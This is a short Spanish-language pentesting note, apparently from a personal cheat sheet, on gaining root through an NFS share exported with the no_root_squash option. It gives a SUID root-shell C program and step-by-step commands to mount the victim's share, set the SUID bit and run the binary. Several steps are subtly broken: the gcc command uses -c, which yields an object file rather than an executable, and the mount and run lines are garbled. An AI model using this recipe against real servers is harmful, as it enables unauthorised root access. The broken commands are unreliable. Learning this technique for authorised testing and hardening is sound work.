Si en los recursos compartidos por NFS está la flag no_root_squash podemos escalar privilegios explotando esta mala configuración.

Ya que si estuviese la flag root_squash, al acceder a los recursos como root, se cambiará automáticamente a nfsnobody.

1. Listamos desde la máquina donde corre servidor NFS los recursos compartidos: `cat /etc/exports`
2. Si en algún recurso tenemos la flag `no_root_squash` podemos escalar.
3. Shell.c para compilar posteriormente:
```shell-session
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

4. Lo compilamos desde usuario no privilegiado: `gcc shell.c -c shell`
5. Montamos recurso compartido en "mnt" desde otra máquina cómo root  `sudo mount -t nfs <ip_victima>:/<recurso_compartido /mnt`
6. Cambiamos el propietario del binario shell a root `chown root:root shell`
7. Activamos SUID `chmod +s shell`
8. Listo en la máquina víctima, desde usuario no privilegiado ejecutamos el binario .`/shell` y escalamos privs.